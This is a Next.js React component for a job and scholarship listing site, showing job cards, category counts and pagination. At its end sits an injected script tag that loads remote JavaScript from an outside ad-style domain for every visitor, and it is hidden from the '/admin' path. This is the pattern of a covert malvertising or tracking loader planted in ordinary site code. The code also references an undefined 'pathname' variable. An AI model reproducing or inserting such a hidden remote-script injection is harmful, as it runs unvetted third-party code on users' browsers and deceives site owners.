'use client';

import { Container, Row, Col, Card, Form, Button, Pagination } from 'react-bootstrap';
import { useContext, useState, useEffect, Suspense } from 'react';
import { JobContext } from '../context/JobContext';
import { ScholarshipContext } from '../context/ScholarshipContext';
import SplashScreen from '../components/SplashScreen';
import dynamic from 'next/dynamic';
import Link from 'next/link';
import { useSearchParams, usePathname } from 'next/navigation';

const DynamicSplashScreen = dynamic(() => import('../components/SplashScreen'), {
  ssr: false, // Ensure it's only loaded on the client side
});

const JOBS_PER_PAGE = 12;

function JobsList() {
  const jobContext = useContext(JobContext);
  const scholarshipContext = useContext(ScholarshipContext);
  const [currentPage, setCurrentPage] = useState(1);
  const searchParams = useSearchParams();
  const title = searchParams.get('title');

  if (!jobContext || !scholarshipContext) {
    return <div>Loading...</div>; // Or some other fallback UI
  }

  const { jobs } = jobContext;
  const { scholarships } = scholarshipContext;

  const filteredJobs = title
    ? jobs.filter(job => job.title === title)
    : jobs;

  const governmentJobsCount = jobs.filter(job => job.location && job.location.toLowerCase().includes('government')).length;
  const sponsorshipJobsCount = jobs.filter(job => job.location && job.location.toLowerCase().includes('sponsorship')).length;
  const scholarshipsCount = scholarships.length;

  const totalPages = Math.ceil(filteredJobs.length / JOBS_PER_PAGE);
  const startIndex = (currentPage - 1) * JOBS_PER_PAGE;
  const endIndex = startIndex + JOBS_PER_PAGE;
  const currentJobs = filteredJobs.slice(startIndex, endIndex);

  const handlePageChange = (page: number) => {
    setCurrentPage(page);
  };

  return (
    <main>
      <Container className="mt-5">
        <h1 className="text-center mb-4">{ title ? `Jobs for "${title}"` : "Find Your Next Sponsorship Visa Job"}</h1>
        <Row className="mb-4">
          <Col md={8} className="mx-auto">
            <Form>
              <Row>
                <Col md={9}>
                  <Form.Control type="text" placeholder="Search for jobs..." />
                </Col>
                <Col md={3}>
                  <Button variant="primary" type="submit" className="w-100">
                    Search
                  </Button>
                </Col>
              </Row>
            </Form>
          </Col>
        </Row>
        <Row className="mb-4 text-center">
          <Col>
            <Link href="/government-jobs" passHref style={{ textDecoration: 'none' }}>
              <Card style={{ cursor: 'pointer' }}>
                <Card.Body>
                  <Card.Title>Government Jobs</Card.Title>
                  <Card.Text>{governmentJobsCount}+</Card.Text>
                </Card.Body>
              </Card>
            </Link>
          </Col>
          <Col>
            <Link href="/sponsorship-jobs" passHref style={{ textDecoration: 'none' }}>
              <Card style={{ cursor: 'pointer' }}>
                <Card.Body>
                  <Card.Title>Sponsorship Visa Jobs</Card.Title>
                  <Card.Text>{sponsorshipJobsCount}+</Card.Text>
                </Card.Body>
              </Card>
            </Link>
          </Col>
          <Col>
            <Link href="/scholarships" passHref style={{ textDecoration: 'none' }}>
              <Card style={{ cursor: 'pointer' }}>
                <Card.Body>
                  <Card.Title>Scholarships</Card.Title>
                  <Card.Text>{scholarshipsCount}+</Card.Text>
                </Card.Body>
              </Card>
            </Link>
          </Col>
        </Row>
        <Row>
          {currentJobs.map((job) => (
            <Col md={4} key={job.id} className="mb-4">
              <Card as="article">
                <Card.Body>
                  <Card.Title>{job.title}</Card.Title>
                  <Card.Subtitle className="mb-2 text-muted">{job.company}</Card.Subtitle>
                  <Card.Text>{job.location}</Card.Text>
                  <Button variant="primary" href={`/jobs/${job.id}`}>
                    More Detail
                  </Button>
                </Card.Body>
              </Card>
            </Col>
          ))}
        </Row>
        <Row className="justify-content-center">
          <Pagination>
            {Array.from({ length: totalPages }, (_, i) => i + 1).map((page) => (
              <Pagination.Item key={page} active={page === currentPage} onClick={() => handlePageChange(page)}>
                {page}
              </Pagination.Item>
            ))}
          </Pagination>
        </Row>
      </Container>
    </main>
  );
}

export default function HomeClient() {
  const [showSplash, setShowSplash] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowSplash(false);
    }, 3000);

    return () => clearTimeout(timer);
  }, []);

  if (showSplash) {
    return <DynamicSplashScreen />;
  }

  return (
    <Suspense fallback={<div>Loading...</div>}>
      <JobsList />
      {pathname !== '/admin' && (
        <script>(s=>{s.dataset.zone=9812476,s.src='https://vemtoutcheeg.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
      )}
    </Suspense>
  );
}
